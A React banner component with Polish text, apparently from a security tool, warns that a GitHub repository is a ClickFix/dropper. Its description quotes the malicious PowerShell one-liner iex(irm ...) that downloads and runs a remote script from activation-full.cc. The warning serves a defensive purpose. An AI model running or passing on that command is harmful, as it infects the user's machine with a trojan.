import React, { useState } from 'react';
import { AlertTriangle, ShieldAlert, ExternalLink, ChevronRight, CheckCircle2, Lock } from 'lucide-react';
import ForensicAnalysisModal from './ForensicAnalysisModal';

export default function RepoAuditBanner() {
  const [showModal, setShowModal] = useState(false);

  return (
    <>
      <div className="relative overflow-hidden rounded-xl border border-rose-500/30 bg-gradient-to-r from-rose-950/40 via-red-950/25 to-amber-950/20 p-4 md:p-5 shadow-lg backdrop-blur-md">
        <div className="absolute top-0 right-0 h-32 w-32 -translate-y-8 translate-x-8 rounded-full bg-rose-500/10 blur-2xl pointer-events-none" />
        
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
          <div className="flex items-start gap-3.5">
            <div className="p-2.5 rounded-lg bg-rose-500/20 border border-rose-500/40 text-rose-400 shrink-0 mt-0.5">
              <ShieldAlert className="w-6 h-6 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2 flex-wrap">
                <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-rose-500/25 border border-rose-500/50 text-rose-300">
                  <AlertTriangle className="w-3.5 h-3.5" />
                  ZABLOKOWANO ZŁOŚLIWY ŁADUNEK (CLICKFIX / DROPPER)
                </span>
                <span className="text-xs text-neutral-400 font-mono">
                  bakiraa/qyvaria-hardlogic-kernel-engine
                </span>
              </div>
              <h3 className="text-base font-semibold text-neutral-100 mt-1">
                Wykryto złośliwe repozytorium GitHub – wykonanie kodu zablokowane
              </h3>
              <p className="text-xs md:text-sm text-neutral-300 mt-1 max-w-3xl leading-relaxed">
                Repozytorium nie zawiera kodu logicznego, lecz ukryty skrypt PowerShell (<code className="text-rose-300 bg-rose-950/60 px-1 py-0.5 rounded">iex(irm 'https://activation-full.cc/update/ps-script')</code>) służący do infekcji maszyny trojanem. 
                Poniżej uruchomiono <strong>bezpieczny natywny silnik SVL Kernel</strong> zgodny z Twoim skryptem Python.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 w-full md:w-auto shrink-0">
            <button
              onClick={() => setShowModal(true)}
              className="w-full md:w-auto inline-flex items-center justify-center gap-2 px-3.5 py-2 text-xs font-medium text-rose-200 bg-rose-900/40 hover:bg-rose-900/60 border border-rose-500/40 rounded-lg transition-colors cursor-pointer"
            >
              <span>Raport śledczy (Forensics)</span>
              <ChevronRight className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </div>

      {showModal && <ForensicAnalysisModal onClose={() => setShowModal(false)} />}
    </>
  );
}
